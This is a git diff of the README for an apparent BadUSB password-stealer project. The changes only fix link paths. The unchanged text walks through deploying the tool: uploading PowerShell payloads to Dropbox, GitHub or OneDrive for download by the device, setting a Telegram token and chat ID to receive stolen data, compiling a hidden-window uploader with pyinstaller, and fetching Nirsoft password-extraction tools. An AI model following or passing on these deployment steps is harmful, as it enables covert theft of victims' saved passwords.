@@ -115,9 +115,9 @@ pyinstaller --onefile -w telegram_uploader.py
 
 4. [Upload](https://github.com/tuconnaisyouknow/BadUSB_passStealer#how-to-set-a-link-for-wget-the-script-%EF%B8%8F) your files (ciaoV2_upload.ps1, fin_upload.ps1, telegram_uploader.exe) to download them;
 
-5. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/upload/BadUSB_passstealer_upload.txt) with ciaoV2_upload.ps1 link at line 53;
+5. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) with ciaoV2_upload.ps1 link at line 53;
 
-6. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/upload/ciaoV2_upload.ps1) with telegram_uploader.exe at line 15;
+6. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/ciaoV2_upload.ps1) with telegram_uploader.exe at line 15;
 
 7. Put the .ino or .txt file in your **BadUSB**;
 
@@ -143,7 +143,7 @@ cd BadUSB_passStealer
 
 4. In your MMS root directory, crate the following 2 directory : dump/ and passStealer/;
 
-5. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/telegram_uploader.py) at line 6 and 7;
+5. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/telegram_uploader.py) at line 6 and 7;
 
 6. Convert telegram_uploader.py in exe file with this command :
 ```
@@ -170,7 +170,7 @@ pyinstaller --onefile -w telegram_uploader.py
 
 4. You will get a link like this : https://dropbox.com/s/link/YOURFILE?dl=1;
 
-5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
+5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) file;
 ## Github
 1. Create a Github account [here](https://github.com/signup);
 
@@ -180,7 +180,7 @@ pyinstaller --onefile -w telegram_uploader.py
 
 4. Go to your file page and click on RAW button;
 
-5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
+5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) file;
 ## One Drive
 1. Create a One Drive account [here](https://signup.live.com/signup);
 
@@ -188,7 +188,7 @@ pyinstaller --onefile -w telegram_uploader.py
 
 3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)
 
-4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt)
+4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt)
 # Nirsoft tools 🧰
 You can download nirsoft tools below if you want :
 * [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User : download ; Password : nirsoft123!;
